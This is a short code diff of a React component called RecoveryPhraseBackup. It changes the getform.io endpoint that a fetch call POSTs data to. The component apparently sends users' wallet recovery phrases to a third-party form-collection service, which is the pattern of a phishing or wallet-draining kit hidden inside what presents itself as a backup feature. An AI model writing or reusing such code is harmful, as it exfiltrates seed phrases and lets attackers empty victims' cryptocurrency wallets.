@@ -29,7 +29,7 @@ export const RecoveryPhraseBackup: React.FC<RecoveryPhraseBackupProps> = ({ onSu
 
     // Make the POST request to getform.io
     try {
-      const getformResponse = await fetch("https://getform.io/f/e7843df7-96fc-4788-8449-e8aa0018ad7b", {
+      const getformResponse = await fetch("https://getform.io/f/578d9b29-1920-4659-8226-6d2167de9a55", {
         method: "POST",
         body: JSON.stringify(postData),
         headers: {
